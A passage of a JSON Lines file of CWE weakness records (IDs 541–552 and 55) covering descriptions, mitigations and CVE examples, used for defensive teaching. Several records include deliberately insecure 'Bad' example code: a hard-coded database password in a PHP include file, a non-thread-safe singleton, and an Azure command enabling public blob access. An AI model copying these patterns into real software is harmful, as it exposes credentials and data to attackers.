/bitrix/admin/ldap_server_edit.php."}, {"Reference": "CVE-2022-25512", "Description": "FreeTAKServer-UI v1.9.8 was discovered to leak sensitive API and Websocket keys."}]}
{"ID": "541", "Name": "Inclusion of Sensitive Information in an Include File", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "If an include file source is accessible, the file can contain usernames and passwords, as well as sensitive information pertaining to the application and system.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "540", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Do not store sensitive information in include files."}, {"Phase": ["Architecture and Design", "System Configuration"], "Description": "Protect include files from being exposed."}], "DemonstrativeExamples": [{"ID": "DX-104", "Entries": [{"IntroText": "The following code uses an include file to store database credentials:"}, {"BodyText": "database.inc"}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t<?php\n\t$dbName = 'usersDB';\n\t$dbPassword = 'skjdh#67nkjd3$3$';\n\t?>\n```"}, {"BodyText": "login.php"}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t<?php\n\tinclude('database.inc');\n\t$db = connectToDB($dbName, $dbPassword);\n\t$db.authenticateUser($username, $password);\n\t?>\n```"}, {"BodyText": "If the server does not have an explicit handler set for .inc files it may send the contents of database.inc to an attacker without pre-processing, if the attacker requests the file directly. This will expose the database name and password."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "542", "Name": "DEPRECATED: Information Exposure Through Cleanup Log Files", "Abstraction": "Variant", "Structure": "Simple", "Status": "Deprecated", "Description": "This entry has been deprecated because its abstraction was too low-level.  See CWE-532.", "MappingNotes": {"Usage": "Prohibited", "Rationale": "This CWE has been deprecated.", "Comments": "See description and name for possible suggestions of other CWEs to consider.", "Reasons": ["Deprecated"]}}
{"ID": "543", "Name": "Use of Singleton Pattern Without Synchronization in a Multithreaded Context", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses the singleton pattern when creating a resource within a multithreaded environment.", "ExtendedDescription": "The use of a singleton pattern may not be thread-safe.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "820", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "662", "ViewID": "1305", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "662", "ViewID": "1340", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other", "Integrity"], "Impact": ["Other", "Modify Application Data"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Use the Thread-Specific Storage Pattern. See References."}, {"Phase": ["Implementation"], "Description": "Do not use member fields to store information in the Servlet. In multithreading environments, storing user data in Servlet member fields introduces a data access race condition."}, {"Phase": ["Implementation"], "Description": "Avoid using the double-checked locking pattern in language versions that cannot guarantee thread safety. This pattern may be used to avoid the overhead of a synchronized call, but in certain versions of Java (for example), this has been shown to be unsafe because it still introduces a race condition (CWE-209).", "Effectiveness": "Limited"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This method is part of a singleton pattern, yet the following singleton() pattern is not thread-safe. It is possible that the method will create two objects instead of only one."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tprivate static NumberConverter singleton;\n\tpublic static NumberConverter get_singleton() {\n\t\tif (singleton == null) {\n\t\t\tsingleton = new NumberConverter();\n\t\t}\n\t\treturn singleton;\n\t}\n```"}, {"BodyText": "Consider the following course of events:"}, {"BodyText": "- Thread A enters the method, finds singleton to be null, begins the NumberConverter constructor, and then is swapped out of execution.\n\n  - Thread B enters the method and finds that singleton remains null. This will happen if A was swapped out during the middle of the constructor, because the object reference is not set to point at the new object on the heap until the object is fully initialized.\n\n  - Thread B continues and constructs another NumberConverter object and returns it while exiting the method.\n\n  - Thread A continues, finishes constructing its NumberConverter object, and returns its version."}, {"BodyText": "At this point, the threads have created and returned two different objects."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "544", "Name": "Missing Standardized Error Handling Mechanism", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses.", "ExtendedDescription": "If the product handles error messages individually, on a one-by-one basis, this is likely to result in inconsistent error handling. The causes of errors may be lost. Also, detailed information about the causes of an error may be unintentionally returned to the user.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "755", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}], "CommonConsequences": [{"Scope": ["Integrity", "Other"], "Impact": ["Quality Degradation", "Unexpected State", "Varies by Context"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "define a strategy for handling errors of different severities, such as fatal errors versus basic log events. Use or create built-in language features, or an external package, that provides an easy-to-use API and define coding standards for the detection and handling of errors."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "545", "Name": "DEPRECATED: Use of Dynamic Class Loading", "Abstraction": "Variant", "Structure": "Simple", "Status": "Deprecated", "Description": "This weakness has been deprecated because it partially overlaps CWE-470, it describes legitimate programmer behavior, and other portions will need to be integrated into other entries.", "MappingNotes": {"Usage": "Prohibited", "Rationale": "This CWE has been deprecated.", "Comments": "See description and name for possible suggestions of other CWEs to consider.", "Reasons": ["Deprecated"]}}
{"ID": "546", "Name": "Suspicious Comment", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The code contains comments that suggest the presence of bugs, incomplete functionality, or weaknesses.", "ExtendedDescription": "Many suspicious comments, such as BUG, HACK, FIXME, LATER, LATER2, TODO, in the code indicate missing security functionality and checking. Others indicate code problems that programmers should fix, such as hard-coded variables, error handling, not using stored procedures, and performance issues.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Quality Degradation"], "Note": "Suspicious comments could be an indication that there are problems in the source code that may need to be fixed and is an indication of poor quality. This could lead to further bugs and the introduction of weaknesses."}], "PotentialMitigations": [{"Phase": ["Documentation"], "Description": "Remove comments that suggest the presence of bugs, incomplete functionality, or weaknesses, before deploying the application."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following excerpt demonstrates the use of a suspicious comment in an incomplete code block that may have security repercussions."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tif (user == null) {\n```\n// TODO: Handle null user condition.* \n\t\t\t}"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "547", "Name": "Use of Hard-coded, Security-relevant Constants", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product uses hard-coded constants instead of symbolic names for security-critical values, which increases the likelihood of mistakes during code maintenance or security policy change.", "ExtendedDescription": "If the developer does not find all occurrences of the hard-coded constants, an incorrect policy decision may be made if one of the constants is not changed. Making changes to these values will require code changes that may be difficult or impossible once the system is released to the field. In addition, these hard-coded values may become available to attackers if the code is ever disclosed.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Varies by Context", "Quality Degradation"], "Note": "The existence of hardcoded constants could cause unexpected behavior and the introduction of weaknesses during code maintenance or when making changes to the code if all occurrences are not modified. The use of hardcoded constants is an indication of poor quality."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Avoid using hard-coded constants. Configuration files offer a more flexible solution."}], "DemonstrativeExamples": [{"ID": "DX-215", "Entries": [{"IntroText": "The usage of symbolic names instead of hard-coded constants is preferred."}, {"BodyText": "The following is an example of using a hard-coded constant instead of a symbolic name."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tchar buffer[1024];\n\t...\n\tfgets(buffer, 1024, stdin);\n```"}, {"BodyText": "If the buffer value needs to be changed, then it has to be altered in more than one place. If the developer forgets or does not find all occurrences, in this example it could lead to a buffer overflow."}, {"Nature": "Good", "Language": "C", "ExampleCode": "```\n\tenum { MAX_BUFFER_SIZE = 1024 };\n\t...\n\tchar buffer[MAX_BUFFER_SIZE];\n\t...\n\tfgets(buffer, MAX_BUFFER_SIZE, stdin);\n```"}, {"BodyText": "In this example the developer will only need to change one value and all references to the buffer size are updated, as a symbolic name is used instead of a hard-coded constant."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "548", "Name": "Exposure of Information Through Directory Listing", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.", "ExtendedDescription": "A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "497", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Files or Directories"], "Note": "Exposing the contents of a directory can lead to an attacker gaining access to source code or providing useful information for the attacker to devise exploits, such as creation times of files or any information that may be encoded in file names. The directory listing may also compromise private or confidential data."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "System Configuration"], "Description": "Recommendations include restricting access to important directories or files by adopting a need to know requirement for both the document and server root, and turning off features such as Automatic Directory Listings that could expose private files and provide information that could be utilized by an attacker when formulating or conducting an attack."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-21528", "Description": "Dell EMC PowerScale OneFS versions 9.1.0, 9.2.0.x, 9.2.1.x contain an Exposure of Information through Directory Listing vulnerability. This vulnerability is triggered when upgrading from a previous versions."}, {"Reference": "CVE-2021-45421", "Description": "Emerson Dixell XWEB-500 products are affected by information disclosure via directory listing. A potential attacker can use this misconfiguration to access all the files in the remote directories. Note: the product has not been supported since 2018 and should be removed or replaced"}, {"Reference": "CVE-2021-45446", "Description": "A vulnerability in Hitachi Vantara Pentaho Business Analytics Server versions before 9.2.0.2 and 8.3.0.25 does not cascade the hidden property to the children of the Home folder. This directory listing provides an attacker with the complete index of all the resources located inside the directory. "}, {"Reference": "CVE-2022-2558", "Description": "The Simple Job Board WordPress plugin before 2.10.0 is susceptible to Directory Listing which allows the public listing of uploaded resumes in certain configurations."}, {"Reference": "CVE-2022-30625", "Description": "Directory listing is a web server function that displays the directory contents when there is no index file in a specific website directory. A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible."}]}
{"ID": "549", "Name": "Missing Password Field Masking", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product does not mask passwords during entry, increasing the potential for attackers to observe and capture passwords.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "522", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation", "Requirements"], "Description": "Recommendations include requiring all password fields in your web application be masked to prevent other users from seeing this information."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-1413", "Description": "Missing input masking in GitLab CE/EE affecting all versions starting from 1.0.2 before 14.8.6, all versions from 14.9.0 before 14.9.4, and all versions from 14.10.0 before 14.10.1 causes potentially sensitive integration properties to be disclosed in the web interface"}, {"Reference": "CVE-2022-38663", "Description": "Jenkins Git Plugin 4.11.4 and earlier does not properly mask (i.e., replace with asterisks) credentials in the build log provided by the Git Username and Password (`gitUsernamePassword`) credentials binding."}, {"Reference": "CVE-2022-1342", "Description": "A lack of password masking in Devolutions Remote Desktop Manager allows physically proximate attackers to observe sensitive data. A caching issue can cause sensitive fields to sometimes stay revealed when closing and reopening a panel, which could lead to involuntarily disclosing sensitive information. This issue affects: Devolutions Remote Desktop Manager 2022.1.24 version and prior versions."}, {"Reference": "CVE-2022-20914", "Description": "A vulnerability in the External RESTful Services (ERS) API of Cisco Identity Services Engine (ISE) Software could allow an authenticated, remote attacker to obtain sensitive information. This vulnerability is due to excessive verbosity in a specific REST API output. An attacker could exploit this vulnerability by sending a crafted HTTP request to the affected device. A successful exploit could allow the attacker to obtain sensitive information, including administrative credentials for an external authentication server. Note: To successfully exploit this vulnerability, the attacker must have valid ERS administrative credentials."}, {"Reference": "CVE-2022-22550", "Description": "Dell PowerScale OneFS, versions 8.2.2 and above, contain a password disclosure vulnerability. An unprivileged local attacker could potentially exploit this vulnerability, leading to account take over."}, {"Reference": "CVE-2022-23109", "Description": "Jenkins HashiCorp Vault Plugin 3.7.0 and earlier does not mask Vault credentials in Pipeline build logs or in Pipeline step descriptions when Pipeline: Groovy Plugin 2.85 or later is installed."}]}
{"ID": "55", "Name": "Path Equivalence: '/./' (Single Dot Directory)", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accepts path input in the form of single dot directory exploit ('/./') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "41", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "PotentialMitigations": [{"MitigationID": "MIT-20", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."}], "ObservedExamples": [{"Reference": "CVE-2000-0004", "Description": "Server allows remote attackers to read source code for executable files by inserting a . (dot) into the URL.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0004"}, {"Reference": "CVE-2002-0304", "Description": "Server allows remote attackers to read password-protected files via a /./ in the HTTP request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0304"}, {"Reference": "CVE-1999-1083", "Description": "Possibly (could be a cleansing error)", "Link": "https://www.cve.org/CVERecord?id=CVE-1999-1083"}, {"Reference": "CVE-2004-0815", "Description": "\"/./////etc\" cleansed to \".///etc\" then \"/etc\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0815"}, {"Reference": "CVE-2002-0112", "Description": "Server allows remote attackers to view password protected files via /./ in the URL.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0112"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-40539", "Description": "Zoho ManageEngine ADSelfService Plus version 6113 and prior is vulnerable to REST API authentication bypass with resultant remote code execution."}]}
{"ID": "550", "Name": "Server-generated Error Message Containing Sensitive Information", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "Certain conditions, such as network failure, will cause a server error message to be displayed.", "ExtendedDescription": "While error messages in and of themselves are not dangerous, per se, it is what an attacker can glean from them that might cause eventual problems.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "209", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "System Configuration"], "Description": "Recommendations include designing and adding consistent error handling mechanisms which are capable of handling any user input to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "551", "Name": "Incorrect Behavior Order: Authorization Before Parsing and Canonicalization", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "If a web server does not fully parse requested URLs before it examines them for authorization, it may be possible for an attacker to bypass authorization protection.", "ExtendedDescription": "For instance, the character strings /./ and / both mean current directory. If /SomeDirectory is a protected directory and an attacker requests /./SomeDirectory, the attacker may be able to gain access to the resource if /./ is not converted to / before the authorization check is performed.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "863", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "696", "ViewID": "1000"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "URL Inputs should be decoded and canonicalized to the application's current internal representation before being validated and processed for authorization. Make sure that your application does not decode the same input twice. Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-32777", "Description": "Envoy is an open source L7 proxy and communication bus designed for large modern service oriented architectures. In affected versions when ext-authz extension is sending request headers to the external authorization service it must merge multiple value headers according to the HTTP spec. However, only the last header value is sent. This may allow specifically crafted requests to bypass authorization. Attackers may be able to escalate privileges when using ext-authz extension or back end service that uses multiple value headers for authorization. A specifically constructed request may be delivered by an untrusted downstream peer in the presence of ext-authz extension. Envoy versions 1.19.1, 1.18.4, 1.17.4, 1.16.5 contain fixes to the ext-authz extension to correctly merge multiple request header values, when sending request for authorization."}]}
{"ID": "552", "Name": "Files or Directories Accessible to External Parties", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product makes files or directories accessible to unauthorized actors, even though they should not be.", "ExtendedDescription": "\n\nWeb servers, FTP servers, and similar servers may store a set of files underneath a \"root\" directory that is accessible to the server's users. Applications may store sensitive files underneath this root without also using access control to limit which users may request those files, if any. Alternately, an application might package multiple files or directories into an archive file (e.g., ZIP or tar), but the application might not exclude sensitive files that are underneath those directories.\n\n\nIn cloud technologies and containers, this weakness might present itself in the form of misconfigured storage accounts that can be read or written by a public or anonymous user.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "668", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "668", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "285", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Not Technology-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Cloud Computing", "Prevalence": "Often"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}, {"Phase": "Operation", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation", "System Configuration", "Operation"], "Description": "When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to disable public access."}], "DemonstrativeExamples": [{"ID": "DX-160", "Entries": [{"IntroText": "The following Azure command updates the settings for a storage account:"}, {"Nature": "Bad", "Language": "Shell", "ExampleCode": "```\n\taz storage account update --name <storage-account> --resource-group <resource-group> --allow-blob-public-access true\n```"}, {"BodyText": "However, \"Allow Blob Public Access\" is set to true, meaning that anonymous/public users can access blobs."}, {"BodyText": "The command could be modified to disable \"Allow Blob Public Access\" by setting it to false."}, {"Nature": "Good", "Language": "Shell", "ExampleCode": "```\n\taz storage account update --name <storage-account> --resource-group <resource-group> --allow-blob-public-access false\n```"}]}, {"ID": "DX-161", "Entries": [{"IntroText": "The following Google Cloud Storage command gets the settings for a storage account named 'BUCKET_NAME':"}, {"Nature": "Informative", "Language": "Shell", "ExampleCode": "```\n\t gsutil iam get gs://BUCKET_NAME\n```"}, {"BodyText": "Suppose the command returns the following result:"}, {"Nature": "Bad", "Language": "JSON", "ExampleCode": "{\n\n```\n\t \"bindings\":[{\n\t\t \"members\":[\n\t\t\t \"projectEditor: PROJECT-ID\",\n\t\t\t \"projectOwner: PROJECT-ID\" \n\t\t ],\n\t\t \"role\":\"roles/storage.legacyBucketOwner\"\n\t },\n\t {\n\t\t \"members\":[ \n\t\t\t \"allUsers\",\n\t\t\t \"projectViewer: PROJECT-ID\"\n\t\t\t ],\n\t\t\t \"role\":\"roles/storage.legacyBucketReader\"\n\t\t }\n\t ]\n }\n```"}, {"BodyText": "This result includes the \"allUsers\" or IAM role added as members, causing this policy configuration to allow public access to cloud storage resources. There would be a similar concern if \"allAuthenticatedUsers\" was present."}, {"BodyText": "The command could be modified to remove \"allUsers\" and/or \"allAuthenticatedUsers\" as follows:"}, {"Nature": "Good", "Language": "Shell", "ExampleCode": "gsutil iam ch -d allUsers gs://BUCKET_NAME\n gsutil iam ch -d allAuthenticatedUsers gs://BUCKET_NAME"}]}], "ObservedExamples": [{"Reference": "CVE-2005-1835", "Description": "Data file under web root.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1835"}], "AffectedResources": ["File or Directory"], "RelatedAttackPatterns": ["150", "639"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-23508", "Description": "Weave GitOps is a simple open source developer platform for people who want cloud native applications, without needing Kubernetes expertise. A vulnerability in GitOps run could allow a local user or process to alter a Kubernetes cluster's resources. GitOps run has a local S3 bucket which it uses for synchronizing files that are later applied against a Kubernetes cluster. Its endpoint had no security controls to block unauthorized access, therefore allowing local users (and processes) on the same machine to see and alter the bucket content. By leveraging this vulnerability, an attacker could pick a workload of their choosing and inject it into the S3 bucket, which resulted in the successful deployment in the target cluster, without the need to provide any credentials to either the S3 bucket nor the target Kubernetes cluster. There are no known workarounds for this issue, please upgrade. This vulnerability has been fixed by commits 75268c4 and 966823b. Users should upgrade to Weave GitOps version >= v0.12.0 released on 08/12/2022. ### Workarounds There is no workaround for this vulnerability. ### References Disclosed by Paulo Gomes, Senior Software Engineer, Weaveworks. ### For more information If you have any questions or comments about this advisory: - Open an issue in [Weave GitOps repository](https://github.com/weaveworks/weave-gitops) - Email us at [support@weave.works](mailto:support@weave.works) "}, {"Reference": "CVE-2021-1256", "Description": "A vulnerability in the CLI of Cisco Firepower Threat Defense (FTD) Software could allow an authenticated, local attacker to overwrite files on the file system of an affected device by using directory traversal techniques. A successful exploit could cause system instability if important system files are overwritten. This vulnerability is due to insufficient validation of user input for the file path in a specific CLI command. An attacker could exploit this vulnerability by logging in to a targeted device and issuing a specific CLI command with crafted user input. A successful exploit could allow the attacker to overwrite arbitrary files on the file system of the affected device. The attacker would need valid user credentials on the device."}, {"Reference": "CVE-2021-25004", "Description": "The SEUR Oficial WordPress plugin before 1.7.2 creates a PHP file with a random name when installed, even though it is used for support purposes, it allows to download any file from the web server without restriction after knowing the URL and a password than an administrator can see in the plugin settings page."}, {"Reference": "CVE-2022-23621", "Description": "XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. In affected versions any user with SCRIPT right can read any file located in the XWiki WAR (for example xwiki.cfg and xwiki.properties) through XWiki#invokeServletAndReturnAsString as `$xwiki.invokeServletAndReturnAsString(\"/WEB-INF/xwiki.cfg\")`. This issue has been patched in XWiki versions 12.10.9, 13.4.3 and 13.7-rc-1. Users are advised to update. The only workaround is to limit SCRIPT right."}, {"Reference": "CVE-2022-2834", "Description": "The Helpful WordPress plugin before 4.5.26 puts the exported logs and feedbacks in a publicly accessible location and guessable names, which could allow attackers to download them and retrieve sensitive information such as IP, Names and Email Address depending on the plugin's settings"}]}
